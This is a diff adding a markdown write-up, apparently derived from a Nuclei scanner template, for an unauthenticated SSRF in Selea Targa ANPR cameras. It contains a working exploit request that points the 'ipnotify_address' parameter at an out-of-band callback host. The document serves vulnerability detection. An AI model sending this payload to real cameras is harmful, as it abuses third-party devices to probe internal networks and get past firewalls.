@@ -1,0 +1,23 @@
+# Nuclei Template: Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF
+**Template ID:** targa-camera-ssrf
+**Vulnerability Class:** Server-Side Request Forgery (SSRF)
+**Severity:** High
+**Source:** Nuclei Template (`targa-camera-ssrf.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameters 'ipnotify_address' and 'url' to construct an image request or check DNS for IP notification. Since no validation is carried out on the parameters, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.
+
+## Steps to reproduce / Exploit Payload
+```http
+POST /cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE HTTP/1.1
+Host: {{Hostname}}
+content-type: application/json
+Accept: */*
+
+{"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{{interactsh-url}}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}
+```
+
+## References
+- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php
